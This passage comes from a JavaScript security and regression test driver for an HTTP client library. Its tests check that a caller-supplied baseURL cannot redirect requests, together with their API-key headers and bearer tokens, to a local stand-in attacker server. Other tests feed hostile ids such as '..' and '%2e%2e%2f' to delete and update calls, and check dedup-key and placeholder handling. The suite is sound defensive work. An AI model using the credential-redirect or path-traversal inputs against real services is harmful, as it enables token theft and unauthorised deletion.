   * BLOCKER 1 (fix-2.2.0-blockers, post-release adversarial re-probe): the
   * IDENTICAL exfiltration the ApiClient choke point (`extractCallerRequest
   * Options`, requestOptions.ts) already refuses, reopened through the
   * STANDALONE `minder()` path — a different code shape entirely (`minder()`
   * builds its outgoing axios config by hand-picking named fields off
   * `options`, never spreading them), so the choke point never covered it.
   * `minder('secStandaloneThing', undefined, { baseURL: '<attacker>' })` used
   * to dispatch to the caller-supplied host carrying BOTH the registered
   * route's own declared header (a static `X-Api-Key`) AND the ambient
   * bearer token set via `minder.config({ token })`, with no throw and
   * `success:true` — while the legitimate host received ZERO requests. A
   * SECOND, independent recording server stands in for the attacker.
   * `minder.config({ token: undefined })` in `finally` resets the ambient
   * token — this module-level store persists for the rest of the process
   * (other wire drivers reuse the SAME cached package instance), so leaving
   * it set would contaminate any later case that assumes no ambient token.
   */
  async function minderBaseUrlRegisteredRouteRefusesCase(mdp) {
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    try {
      mdp.configureMinder({
        apiUrl: recorder.baseUrl,
        routes: {
          secStandaloneThing: { method: 'GET', url: '/things/:id', headers: { 'X-Api-Key': 'SUPER-SECRET' } },
        },
      });
      mdp.minder.config({ token: 'AMBIENT-BEARER-SECRET' });
      const result = await mdp.minder('secStandaloneThing', undefined, {
        params: { id: '1' },
        baseURL: attacker.baseUrl,
      });
      const legitTouched = recorder.records.length > 0;
      const attackerTouched = attacker.records.length > 0;
      const keyLeaked = attacker.records.some((r) => r.headers['x-api-key'] === 'SUPER-SECRET');
      const tokenLeaked = attacker.records.some((r) =>
        String(r.headers['authorization'] || '').includes('AMBIENT-BEARER-SECRET'),
      );
      const refused = result?.success === false && result?.error != null;
      const pass = refused && !legitTouched && !attackerTouched && !keyLeaked && !tokenLeaked;
      results.push({
        id: 'sec-minder-baseurl-registered-route-refuses-no-leak',
        pass,
        message: pass
          ? `standalone minder('secStandaloneThing', undefined, { baseURL: "${attacker.baseUrl}" }) refused (error.code="${result?.error?.code}", "${result?.error?.message}") before dispatch — zero requests reached EITHER server, and neither the route's X-Api-Key header nor the ambient bearer token leaked`
          : `SECURITY FAILURE: success=${result?.success}, error=${JSON.stringify(result?.error)}, legit requests=${recorder.records.length}, attacker requests=${attacker.records.length}, key leaked=${keyLeaked}, token leaked=${tokenLeaked}`,
      });
    } finally {
      mdp.minder.config({ token: undefined });
      await attacker.close();
    }
  }

  /**
   * BLOCKER 1, END-TO-END PUBLIC-API REACHABILITY: `createTypedMinder(...)
   * .minder()` (src/core/typedRoutes.ts, a public export) DELEGATES straight
   * into the real `minder()` — this proves that delegation actually inherits
   * the fix above rather than bypassing it through a second, untouched entry
   * point. Registers the route under the SAME string the typed route's `url`
   * resolves to, so `minder()`'s own registry lookup matches it exactly like
   * the direct-call case above.
   */
  async function typedMinderBaseUrlRegisteredRouteRefusesCase(mdp) {
    const urlKey = '/typed-thing';
    recorder.clear();
    const attacker = await ctx.startRecordingServer();
    try {
      mdp.configureMinder({
        apiUrl: recorder.baseUrl,
        routes: { [urlKey]: { method: 'GET', url: urlKey, headers: { 'X-Api-Key': 'TYPED-ROUTE-SECRET' } } },
      });
      mdp.minder.config({ token: 'AMBIENT-BEARER-SECRET-TYPED' });
      const api = mdp.createTypedMinder({ thing: mdp.route(urlKey) });
      const result = await api.minder('thing', undefined, { baseURL: attacker.baseUrl });
      const legitTouched = recorder.records.length > 0;
      const attackerTouched = attacker.records.length > 0;
      const keyLeaked = attacker.records.some((r) => r.headers['x-api-key'] === 'TYPED-ROUTE-SECRET');
      const tokenLeaked = attacker.records.some((r) =>
        String(r.headers['authorization'] || '').includes('AMBIENT-BEARER-SECRET-TYPED'),
      );
      const refused = result?.success === false && result?.error != null;
      const pass = refused && !legitTouched && !attackerTouched && !keyLeaked && !tokenLeaked;
      results.push({
        id: 'sec-typedminder-baseurl-registered-route-refuses-no-leak',
        pass,
        message: pass
          ? `createTypedMinder({...}).minder('thing', undefined, { baseURL: "${attacker.baseUrl}" }) — the public typed-routes wrapper, which delegates straight into minder() — refused (error.code="${result?.error?.code}") before dispatch; zero requests reached EITHER server and neither the route's X-Api-Key header nor the ambient bearer token leaked`
          : `SECURITY FAILURE (createTypedMinder delegation): success=${result?.success}, error=${JSON.stringify(result?.error)}, legit=${recorder.records.length}, attacker=${attacker.records.length}, key leaked=${keyLeaked}, token leaked=${tokenLeaked}`,
      });
    } finally {
      mdp.minder.config({ token: undefined });
      await attacker.close();
    }
  }

  /**
   * SHOULD-FIX 3 (fix-2.2.0-blockers, dedup-key round 3): `paramsSerializer`
   * is on the forwardable allowlist (requestOptions.ts) and is genuinely
   * wire-affecting — it controls how `params` gets encoded into the actual
   * query string — but the previous `JSON.stringify(requestConfig)` dedup key
   * silently DROPPED function-valued fields entirely, so two concurrent GETs
   * to the SAME route with the SAME `params` but DIFFERENT `paramsSerializer`
   * functions computed the SAME cache key and collapsed into ONE wire
   * request. Both serializers here ignore their input and return a fixed,
   * distinguishing query string, isolating `paramsSerializer` itself (not
   * `params` content) as the only difference between the two calls.
   */
  async function securityDedupParamsSerializerDivergenceNoCollapseCase(mdp) {
    const routeName = 'secDedupParamsSerializer';
    recorder.clear();
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'GET', url: '/dedup-paramsserializer' } },
      performance: { deduplication: true },
    });
    try {
      const apiClient = box.current.apiClient;
      const [resultA, resultB] = await Promise.all([
        apiClient.request(routeName, undefined, undefined, {
          params: { tags: ['a', 'b'] },
          paramsSerializer: () => 'variant=A',
        }),
        apiClient.request(routeName, undefined, undefined, {
          params: { tags: ['a', 'b'] },
          paramsSerializer: () => 'variant=B',
        }),
      ]);
      const twoWireRequests = recorder.records.length === 2;
      const aGotOwnResponse = resultA?.receivedUrl === '/dedup-paramsserializer?variant=A';
      const bGotOwnResponse = resultB?.receivedUrl === '/dedup-paramsserializer?variant=B';
      const pass = twoWireRequests && aGotOwnResponse && bGotOwnResponse;
      results.push({
        id: 'sec-dedup-paramsserializer-divergence-no-collapse',
        pass,
        message: pass
          ? `two concurrent GETs to the SAME route with the SAME params but DIFFERENT paramsSerializer functions dispatched as TWO separate wire requests (${recorder.records.length}) and EACH caller received the response matching ITS OWN encoded query string (A="${resultA?.receivedUrl}", B="${resultB?.receivedUrl}")`
          : `DEDUP FAILURE: wire requests=${recorder.records.length} (expected 2), A got "${resultA?.receivedUrl}" (expected /dedup-paramsserializer?variant=A), B got "${resultB?.receivedUrl}" (expected /dedup-paramsserializer?variant=B): ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * item 3a (fix-2.2.0-blockers, adversarial re-probe): the id is supplied
   * ONLY via `options.params` (the 4th-arg options object), never the
   * dedicated 3rd positional `params` argument. Previously `resolveRequest`
   * only ever saw the positional argument, so the ':id' placeholder stayed
   * literally unresolved AND the redundant '?id=' still landed on the wire
   * (observed: `DELETE /thing/:id?id=7`). Must now send a clean, fully
   * path-substituted request with NO redundant query string.
   */
  async function optionParamsPathSubstitutionCase(mdp) {
    const routeName = 'item3Thing';
    recorder.clear();
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'DELETE', url: '/thing/:id' } },
    });
    try {
      const apiClient = box.current.apiClient;
      await apiClient.request(routeName, undefined, undefined, { params: { id: '7' } });
      const rec = recorder.records[recorder.records.length - 1];
      const pass = !!rec && rec.method === 'DELETE' && rec.url === '/thing/7';
      results.push({
        id: 'item3-options-params-only-resolves-path-no-redundant-query',
        pass,
        message: pass
          ? `apiClient.request() with the id supplied ONLY via options.params sent a clean DELETE /thing/7 (path substituted, no redundant query string)`
          : `sent ${rec ? `${rec.method} ${rec.url}` : 'NOTHING'}, expected DELETE /thing/7 (previously: a literal DELETE /thing/:id?id=7)`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * item 3b — the dispatch-time unresolved-placeholder guard. No params are
   * supplied via EITHER channel for a route that requires one; must refuse
   * with a directed error before dispatch rather than sending the literal
   * ":id" token on the wire.
   */
  async function unresolvedPlaceholderRefusesCase(mdp) {
    const routeName = 'item3ThingB';
    recorder.clear();
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'DELETE', url: '/thingb/:id' } },
    });
    try {
      const apiClient = box.current.apiClient;
      let threw = false;
      let errMessage = '';
      try {
        await apiClient.request(routeName, undefined, undefined, {});
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const zeroRequests = recorder.records.length === 0;
      const pass = threw && zeroRequests;
      results.push({
        id: 'item3-unresolved-placeholder-refuses',
        pass,
        message: pass
          ? `apiClient.request() with NO id supplied for a ':id' route refused ("${errMessage}") before dispatch instead of sending the literal unresolved placeholder`
          : threw
            ? `threw ("${errMessage}") but ${recorder.records.length} request(s) still reached the wire`
            : `did NOT throw — sent ${recorder.records.length} request(s) carrying a literal unresolved placeholder`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * item 4 (fix-2.2.0-blockers, adversarial re-probe): `options.method: ''`
   * is non-nullish JUNK, not an absent override. `overrides.method ??
   * route.method` previously picked the junk directly (nullish-coalescing
   * never even looks at `route.method` once the left side is non-nullish),
   * so the OLD code discarded the perfectly valid DECLARED route method
   * ('POST') for a generic 'GET' fallback. Must dispatch the DECLARED
   * method.
   */
  async function junkMethodOverrideFallsBackCase(mdp) {
    const routeName = 'item4Thing';
    recorder.clear();
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'POST', url: '/item4' } },
    });
    try {
      const apiClient = box.current.apiClient;
      await apiClient.request(routeName, { a: 1 }, undefined, { method: '' });
      const rec = recorder.records[recorder.records.length - 1];
      const pass = !!rec && rec.method === 'POST';
      results.push({
        id: 'item4-junk-method-override-falls-back-to-declared-method',
        pass,
        message: pass
          ? `apiClient.request() with a JUNK options.method:'' fell back to the DECLARED route method and sent POST`
          : `sent ${rec ? rec.method : 'NOTHING'}, expected POST (the declared route method) — a junk override must not discard it for a generic GET fallback`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * item 5 (fix-2.2.0-blockers, adversarial re-probe): a route declares an
   * INTERIOR-invalid method ('PO ST' — a stray interior space, e.g. a
   * copy-paste artifact `normalizeHttpMethod`'s outside-only `.trim()`
   * cannot catch). Previously this sailed through as a "normalized" string
   * and reached axios/Node's raw transport, producing a bare
   * "Cannot read properties of undefined (reading '_retryCount')" TypeError
   * with zero requests dispatched. Must now throw a DIRECTED error before
   * any transport call — proven by asserting the error message is NOT that
   * raw TypeError text.
   */
  async function interiorInvalidMethodRefusesCase(mdp) {
    const routeName = 'item5Thing';
    recorder.clear();
    const { box, unmount } = await mountProviderContext(mdp, {
      apiUrl: recorder.baseUrl,
      routes: { [routeName]: { method: 'PO ST', url: '/item5' } },
    });
    try {
      const apiClient = box.current.apiClient;
      let threw = false;
      let errMessage = '';
      try {
        await apiClient.request(routeName, { a: 1 });
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const zeroRequests = recorder.records.length === 0;
      const notRawTransportTypeError = !/_retryCount/.test(errMessage);
      const pass = threw && zeroRequests && notRawTransportTypeError;
      results.push({
        id: 'item5-interior-invalid-method-refuses-directed-error',
        pass,
        message: pass
          ? `apiClient.request() on a route declared method:'PO ST' (interior space) refused with a directed error ("${errMessage}") — zero requests reached the wire, no raw transport TypeError`
          : `threw=${threw} ("${errMessage}"), requests=${recorder.records.length}, rawTransportTypeError=${!notRawTransportTypeError} — expected a directed error, zero requests, no "_retryCount" TypeError`,
      });
    } finally {
      unmount();
    }
  }

  /**
   * item 6 (fix-2.2.0-blockers, adversarial re-probe): a REGISTERED route
   * (not the ad-hoc/leading-'/' bypass the pre-existing
   * 'medium-repeated-id-placeholder-both-substituted' case actually
   * exercises) whose URL repeats the SAME ':id' placeholder twice, mounted
   * with the id supplied via the hook-level `{ params }` option.
   * `computeRouteValidation`'s own `replaceUrlParams` call previously used a
   * non-global `.replace()`, so it only ever substituted the FIRST
   * occurrence — leaving the second literally unresolved and (incorrectly)
   * flagging a route the caller supplied a perfectly good id for as
   * INVALID. Must validate successfully and auto-fetch with BOTH
   * occurrences substituted.
   */
  async function repeatedPlaceholderValidatesCase(mdp) {
    const routeName = 'item6Mirror';
    recorder.clear();
    const { box, unmount } = await mountProviderHookWithOptions(
      mdp,
      routeName,
      { params: { id: '42' } },
      { apiUrl: recorder.baseUrl, routes: { [routeName]: { method: 'GET', url: '/item6-mirror/:id/vs/:id' } } },
    );
    try {
      await waitFor(() => recorder.records.length > 0 || box.current?.error != null, { timeout: 2000 });
      const rec = recorder.records[recorder.records.length - 1];
      const pass = !!rec && rec.method === 'GET' && rec.url === '/item6-mirror/42/vs/42';
      results.push({
        id: 'item6-computeroutevalidation-repeated-placeholder-both-substituted-valid',
        pass,
        message: pass
          ? `useMinder(route-with-repeated-':id', {params:{id:'42'}}) validated successfully and auto-fetched GET /item6-mirror/42/vs/42 (BOTH occurrences substituted by computeRouteValidation's replaceUrlParams)`
          : `did not resolve as expected: ${rec ? `${rec.method} ${rec.url}` : 'NOTHING'}, hook error=${box.current?.error?.message}`,
      });
    } finally {
      unmount();
    }
  }

  try {
    await mutateCase('b1-mutate-post-provider-cjs', mdpCjs, 'POST', '/things-post');
    await mutateCase('b1-mutate-put-provider-esm', mdpEsm, 'PUT', '/things-put');
    await mutateCase('b1-mutate-patch-provider-cjs', mdpCjs, 'PATCH', '/things-patch');
    await mutateCase('b1-mutate-delete-provider-esm', mdpEsm, 'DELETE', '/things-delete');

    // `create` needs no ':id' placeholder (it addresses the collection).
    // `update`/`delete` DO need one — see the C5 comment in operationsCase.
    await operationsCase('b1-operations-create-provider-esm', mdpEsm, 'create', 'POST', '/things2-create');
    await operationsCase('b1-operations-update-provider-cjs', mdpCjs, 'update', 'PUT', '/things2-update/:id');
    await operationsCase('b1-operations-delete-provider-esm', mdpEsm, 'delete', 'DELETE', '/things2-delete/:id');
  } catch (err) {
    for (const id of [
      'b1-mutate-post-provider-cjs',
      'b1-mutate-put-provider-esm',
      'b1-mutate-patch-provider-cjs',
      'b1-mutate-delete-provider-esm',
      'b1-operations-create-provider-esm',
      'b1-operations-update-provider-cjs',
      'b1-operations-delete-provider-esm',
    ]) {
      if (!results.some((r) => r.id === id)) {
        results.push({ id, pass: false, message: `driver threw before this case ran: ${err?.message ?? err}` });
      }
    }
  }

  // --- standalone minder() — no provider, no React ---
  try {
    recorder.clear();
    mdpCjs.configureMinder({ apiUrl: recorder.baseUrl, routes: {} });
    await mdpCjs.minder('/standalone-explicit-put', { title: 'hello' }, { method: 'PUT' });
    const rec = lastRecordFor('/standalone-explicit-put');
    const pass = !!rec && rec.method === 'PUT';
    results.push({
      id: 'b1-standalone-explicit-method-cjs',
      pass,
      message: pass
        ? `standalone minder(url, data, {method:'PUT'}) sent PUT`
        : `standalone minder(url, data, {method:'PUT'}) sent ${rec ? rec.method : 'NOTHING'} on the wire`,
    });
  } catch (err) {
    results.push({ id: 'b1-standalone-explicit-method-cjs', pass: false, message: `driver threw: ${err?.message ?? err}` });
  }

  try {
    recorder.clear();
    mdpEsm.configureMinder({
      apiUrl: recorder.baseUrl,
      routes: { registeredThing: { method: 'PUT', url: '/standalone-registry-put' } },
    });
    await mdpEsm.minder('registeredThing', { title: 'hello' });
    const rec = lastRecordFor('/standalone-registry-put');
    const pass = !!rec && rec.method === 'PUT';
    results.push({
      id: 'b1-standalone-registry-method-esm',
      pass,
      message: pass
        ? `standalone minder('registeredThing', data) resolved the registered PUT method`
        : `standalone minder('registeredThing', data) sent ${rec ? rec.method : 'NOTHING'} instead of the registered PUT`,
    });
  } catch (err) {
    results.push({ id: 'b1-standalone-registry-method-esm', pass: false, message: `driver threw: ${err?.message ?? err}` });
  }

  // --- C1: FAILURE PATH — standalone (no-provider) mutate() against a dead port ---
  try {
    const deadPort = await getDeadPort();
    const { box, unmount } = await mountStandaloneHook(mdpCjs, 'deadThing', {
      apiUrl: `http://127.0.0.1:${deadPort}`,
      routes: { deadThing: { method: 'POST', url: '/create' } },
    });
    try {
      const result = await box.current.mutate({ title: 'hello' });
      const pass =
        result != null &&
        result.success === false &&
        result.error != null &&
        result.data === null;
      results.push({
        id: 'c1-standalone-mutate-dead-port-reports-failure',
        pass,
        message: pass
          ? 'standalone useMinder().mutate() against a dead port reported success:false at the TOP level with no double-wrap'
          : `standalone useMinder().mutate() against a dead port returned ${JSON.stringify(result)}`,
      });
    } finally {
      unmount();
    }
  } catch (err) {
    results.push({
      id: 'c1-standalone-mutate-dead-port-reports-failure',
      pass: false,
      message: `driver threw: ${err?.message ?? err}`,
    });
  }

  // --- C2: standalone minder() DELETE must carry a body ---
  try {
    recorder.clear();
    mdpCjs.configureMinder({ apiUrl: recorder.baseUrl, routes: {} });
    await mdpCjs.minder('/things-delete-body', { reason: 'cleanup' }, { method: 'DELETE' });
    const rec = lastRecordFor('/things-delete-body');
    const pass = !!rec && rec.method === 'DELETE' && rec.rawBody.includes('cleanup');
    results.push({
      id: 'c2-standalone-delete-carries-body',
      pass,
      message: pass
        ? 'standalone minder(url, data, {method:"DELETE"}) sent the body on the wire'
        : `standalone DELETE rawBody was ${rec ? JSON.stringify(rec.rawBody) : 'NO REQUEST RECORDED'}`,
    });
  } catch (err) {
    results.push({ id: 'c2-standalone-delete-carries-body', pass: false, message: `driver threw: ${err?.message ?? err}` });
  }

  // --- C4: mounting a hook whose route declares a mutating verb must not auto-fetch ---
  try {
    recorder.clear();
    const { unmount } = await mountProviderHook(mdpEsm, 'createUser', {
      apiUrl: recorder.baseUrl,
      routes: { createUser: { method: 'POST', url: '/users' } },
    });
    try {
      // TanStack's mount-time auto-fetch effect dispatches asynchronously, not
      // synchronously during render — give it a real chance to fire if the bug
      // were still present.
      await new Promise((r) => setTimeout(r, 300));
      const pass = recorder.records.length === 0;
      results.push({
        id: 'c4-mount-mutating-route-does-not-autofetch',
        pass,
        message: pass
          ? 'mounting useMinder("createUser") (a POST route) fired zero requests before any explicit mutate()/operations call'
          : `mounting useMinder("createUser") fired ${recorder.records.length} request(s) on mount: ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  } catch (err) {
    results.push({
      id: 'c4-mount-mutating-route-does-not-autofetch',
      pass: false,
      message: `driver threw: ${err?.message ?? err}`,
    });
  }

  // --- C5: FAILURE PATH — operations.delete() must refuse, never mass-delete ---
  try {
    recorder.clear();
    // autoFetch:false so the base GET route's OWN mount-time fetch (unrelated
    // to this assertion) never adds a request the "zero requests" check below
    // would misattribute to operations.delete().
    const { box, unmount } = await mountProviderHookWithOptions(
      mdpCjs,
      'things4',
      { autoFetch: false },
      { apiUrl: recorder.baseUrl, routes: { things4: { method: 'GET', url: '/things4' } } },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      let threw = false;
      let errMessage = '';
      try {
        await box.current.operations.delete('5');
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const zeroRequests = recorder.records.length === 0;
      const pass = threw && zeroRequests;
      results.push({
        id: 'c5-operations-delete-no-id-placeholder-refuses',
        pass,
        message: pass
          ? `operations.delete('5') on a route with no ':id' placeholder and no sibling refused with a directed error ("${errMessage}") and never touched the wire`
          : threw
            ? `operations.delete('5') threw ("${errMessage}") but ${recorder.records.length} request(s) still reached the server: ${JSON.stringify(recorder.records)}`
            : `operations.delete('5') did NOT throw — it silently sent ${recorder.records.length} request(s): ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  } catch (err) {
    results.push({
      id: 'c5-operations-delete-no-id-placeholder-refuses',
      pass: false,
      message: `driver threw before completing: ${err?.message ?? err}`,
    });
  }

  // --- C5: no redundant "?id=" query string on a ":id" route ---
  try {
    recorder.clear();
    const { unmount } = await mountProviderHookWithOptions(
      mdpEsm,
      'thingsById',
      { params: { id: '7' } },
      { apiUrl: recorder.baseUrl, routes: { thingsById: { method: 'GET', url: '/things-by-id/:id' } } },
    );
    try {
      await waitFor(() => recorder.records.length > 0, { timeout: 2000 });
      const rec = recorder.records[recorder.records.length - 1];
      const pass = !!rec && rec.url === '/things-by-id/7';
      results.push({
        id: 'c5-id-route-no-redundant-query-param',
        pass,
        message: pass
          ? `GET on a ':id' route substituted the id into the path with no redundant '?id=' query string (${rec.url})`
          : `GET on a ':id' route produced url ${rec ? rec.url : 'NO REQUEST RECORDED'} — expected exactly '/things-by-id/7' with no redundant ?id= query`,
      });
    } finally {
      unmount();
    }
  } catch (err) {
    results.push({
      id: 'c5-id-route-no-redundant-query-param',
      pass: false,
      message: `driver threw: ${err?.message ?? err}`,
    });
  }

  // --- C5: HOSTILE ID VALUES on operations.delete() (route SHAPE is fine — an
  // explicit ':id' placeholder exists; only the id VALUE is hostile) ---
  try {
    await hostileIdCase('c5-delete-empty-string-id-refuses', mdpCjs, 'delete', 'DELETE', '/hostile-del-empty/:id', 'hostileDelEmpty', '', "''");
    await hostileIdCase('c5-delete-traversal-dotdot-id-refuses', mdpEsm, 'delete', 'DELETE', '/hostile-del-dotdot/:id', 'hostileDelDotdot', '..', "'..'");
    await hostileIdCase('c5-delete-null-id-refuses', mdpCjs, 'delete', 'DELETE', '/hostile-del-null/:id', 'hostileDelNull', null, 'null');
    await hostileIdCase('c5-delete-undefined-id-refuses', mdpEsm, 'delete', 'DELETE', '/hostile-del-undefined/:id', 'hostileDelUndefined', undefined, 'undefined');
    await hostileIdCase('c5-delete-nan-id-refuses', mdpCjs, 'delete', 'DELETE', '/hostile-del-nan/:id', 'hostileDelNan', NaN, 'NaN');
    await hostileIdCase('c5-delete-whitespace-id-refuses', mdpEsm, 'delete', 'DELETE', '/hostile-del-ws/:id', 'hostileDelWs', '   ', "'   '");
    await hostileIdCase('c5-delete-embedded-slash-id-refuses', mdpCjs, 'delete', 'DELETE', '/hostile-del-slash/:id', 'hostileDelSlash', '5/6', "'5/6'");
    await hostileIdCase('c5-delete-backslash-id-refuses', mdpEsm, 'delete', 'DELETE', '/hostile-del-backslash/:id', 'hostileDelBackslash', 'a\\b', "'a\\\\b'");
    await hostileIdCase('c5-delete-encoded-dotdot-id-refuses', mdpCjs, 'delete', 'DELETE', '/hostile-del-enc-dotdot/:id', 'hostileDelEncDotdot', '%2e%2e%2f', "'%2e%2e%2f'");
    await hostileIdCase('c5-delete-encoded-slash-id-refuses', mdpEsm, 'delete', 'DELETE', '/hostile-del-enc-slash/:id', 'hostileDelEncSlash', 'a%2fb', "'a%2fb'");

    // --- C5: HOSTILE ID VALUES on operations.update() — update() must never CREATE ---
    await hostileIdCase('c5-update-empty-string-id-refuses', mdpCjs, 'update', 'PUT', '/hostile-upd-empty/:id', 'hostileUpdEmpty', '', "''");
    await hostileIdCase('c5-update-traversal-dotdot-id-refuses', mdpEsm, 'update', 'PUT', '/hostile-upd-dotdot/:id', 'hostileUpdDotdot', '..', "'..'");
    await hostileIdCase('c5-update-null-id-refuses', mdpCjs, 'update', 'PUT', '/hostile-upd-null/:id', 'hostileUpdNull', null, 'null');
    await hostileIdCase('c5-update-undefined-id-refuses', mdpEsm, 'update', 'PUT', '/hostile-upd-undefined/:id', 'hostileUpdUndefined', undefined, 'undefined');
  } catch (err) {
    for (const id of [
      'c5-delete-empty-string-id-refuses',
      'c5-delete-traversal-dotdot-id-refuses',
      'c5-delete-null-id-refuses',
      'c5-delete-undefined-id-refuses',
      'c5-delete-nan-id-refuses',
      'c5-delete-whitespace-id-refuses',
      'c5-delete-embedded-slash-id-refuses',
      'c5-delete-backslash-id-refuses',
      'c5-delete-encoded-dotdot-id-refuses',
      'c5-delete-encoded-slash-id-refuses',
      'c5-update-empty-string-id-refuses',
      'c5-update-traversal-dotdot-id-refuses',
      'c5-update-null-id-refuses',
      'c5-update-undefined-id-refuses',
    ]) {
      if (!results.some((r) => r.id === id)) {
        results.push({ id, pass: false, message: `driver threw before this case ran: ${err?.message ?? err}` });
      }
    }
  }

  // --- C5: AD-HOC BYPASS — the exact architect-proven wire bypasses ---
  try {
    await adhocRefusesCase('c5-adhoc-delete-no-id-placeholder-refuses', mdpCjs, 'delete', '/things-adhoc-c5-delete', 7);
    await adhocRefusesCase('c5-adhoc-update-no-id-placeholder-refuses', mdpEsm, 'update', '/things-adhoc-c5-update', 7);
    await adhocResolvesWithIdCase('c5-adhoc-delete-with-id-placeholder-resolves', mdpCjs, '/things-adhoc-c5-id/:id', '9', 'DELETE', '/things-adhoc-c5-id/9');
  } catch (err) {
    for (const id of [
      'c5-adhoc-delete-no-id-placeholder-refuses',
      'c5-adhoc-update-no-id-placeholder-refuses',
      'c5-adhoc-delete-with-id-placeholder-resolves',
    ]) {
      if (!results.some((r) => r.id === id)) {
        results.push({ id, pass: false, message: `driver threw before this case ran: ${err?.message ?? err}` });
      }
    }
  }

  // --- N1: THE GOLDEN PATH — ONE registered route, create/fetch/update(id)/delete(id) all working ---
  try {
    await goldenPathCase(mdpEsm, '/gp-items');
  } catch (err) {
    for (const id of [
      'n1-golden-path-mount-autofetch-resolves-to-collection',
      'n1-golden-path-fetch-resolves-to-collection',
      'n1-golden-path-create-resolves-to-collection',
      'n1-golden-path-update-substitutes-id',
      'n1-golden-path-delete-substitutes-id',
    ]) {
      if (!results.some((r) => r.id === id)) {
        results.push({ id, pass: false, message: `driver threw before this case ran: ${err?.message ?? err}` });
      }
    }
  }

  // --- N1 regression guard: a route with NO ':id' placeholder ANYWHERE (no
  // siblings) must still REFUSE update() exactly like it already refuses
  // delete() (c5-operations-delete-no-id-placeholder-refuses above) — proves
  // the Golden Path fix did not loosen the C5 guard for the genuinely
  // unaddressable case. ---
  try {
    recorder.clear();
    const { box, unmount } = await mountProviderHookWithOptions(
      mdpCjs,
      'thingsNoId',
      { autoFetch: false },
      { apiUrl: recorder.baseUrl, routes: { thingsNoId: { method: 'GET', url: '/things-no-id' } } },
      (r) => r !== undefined && r.operations !== undefined,
    );
    try {
      let threw = false;
      let errMessage = '';
      try {
        await box.current.operations.update('5', { title: 'hello' });
      } catch (e) {
        threw = true;
        errMessage = e?.message ?? String(e);
      }
      const zeroRequests = recorder.records.length === 0;
      const pass = threw && zeroRequests;
      results.push({
        id: 'n1-no-id-placeholder-update-still-refuses',
        pass,
        message: pass
          ? `operations.update('5', ...) on a route with no ':id' placeholder and no sibling refused with a directed error ("${errMessage}") and never touched the wire`
          : threw
            ? `operations.update('5', ...) threw ("${errMessage}") but ${recorder.records.length} request(s) still reached the server: ${JSON.stringify(recorder.records)}`
            : `operations.update('5', ...) did NOT throw — it silently sent ${recorder.records.length} request(s): ${JSON.stringify(recorder.records)}`,
      });
    } finally {
      unmount();
    }
  } catch (err) {
    results.push({
      id: 'n1-no-id-placeholder-update-still-refuses',
      pass: false,
      message: `driver threw before completing: ${err?.message ?? err}`,
    });
  }

  // --- N4: documented shorthand string route on a HAND-BUILT config (no configureMinder()) ---
  try {
    await handBuiltShorthandCase(mdpCjs, 'things', '/things');
  } catch (err) {
    for (const id of [
      'n4-handbuilt-shorthand-fetch-resolves',
      'n4-handbuilt-shorthand-create-resolves',
      'n4-handbuilt-shorthand-update-resolves',
      'n4-handbuilt-shorthand-delete-resolves',
    ]) {
      if (!results.some((r) => r.id === id)) {
        results.push({ id, pass: false, message: `driver threw before this case ran: ${err?.message ?? err}` });
      }
    }
  }

  // --- FIX-A headline acceptance test: README's Golden Path snippet, VERBATIM, default options ---
  try {
    await readmeGoldenPathVerbatimCase(mdpCjs, '/gp-users');
  } catch (err) {
    for (const id of [
      'n1-readme-golden-path-verbatim-autofetch',
      'n1-readme-golden-path-verbatim-create',
      'n1-readme-golden-path-verbatim-update',
      'n1-readme-golden-path-verbatim-delete',
    ]) {
      if (!results.some((r) => r.id === id)) {
        results.push({ id, pass: false, message: `driver threw before this case ran: ${err?.message ?? err}` });
      }
    }
  }

  // --- CRITICAL: case-sensitive method comparison must not dispatch the wrong verb ---
  try {
    await lowercaseMethodCase(mdpEsm, '/lc-items');
  } catch (err) {
    for (const id of [
      'critical-lowercase-method-create-sends-post',
      'critical-lowercase-method-update-sends-put',
      'critical-lowercase-method-delete-sends-delete',
    ]) {
      if (!results.some((r) => r.id === id)) {
        results.push({ id, pass: false, message: `driver threw before this case ran: ${err?.message ?? err}` });
      }
    }
  }
  try {
    await lowercaseMethodSiblingCase(mdpCjs, '/lc-sib');
  } catch (err) {
    if (!results.some((r) => r.id === 'critical-lowercase-method-sibling-redirect-sends-post')) {
      results.push({
        id: 'critical-lowercase-method-sibling-redirect-sends-post',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await lowercaseMethodHandBuiltCase(mdpEsm, '/lc-handbuilt');
  } catch (err) {
    if (!results.some((r) => r.id === 'critical-lowercase-method-handbuilt-config-create-sends-post')) {
      results.push({
        id: 'critical-lowercase-method-handbuilt-config-create-sends-post',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }

  // --- MEDIUM: placeholder substitution robustness ---
  try {
    await repeatedIdPlaceholderCase(mdpEsm);
  } catch (err) {
    if (!results.some((r) => r.id === 'medium-repeated-id-placeholder-both-substituted')) {
      results.push({
        id: 'medium-repeated-id-placeholder-both-substituted',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
    }
  }
  try {
    await nonTerminalIdStillRequiresParamsCase(mdpCjs);
  } catch (err) {
    if (!results.some((r) => r.id === 'medium-nonterminal-id-route-still-requires-params')) {
      results.push({
        id: 'medium-nonterminal-id-route-still-requires-params',
        pass: false,
        message: `driver threw before this case ran: ${err?.message ?? err}`,
      });
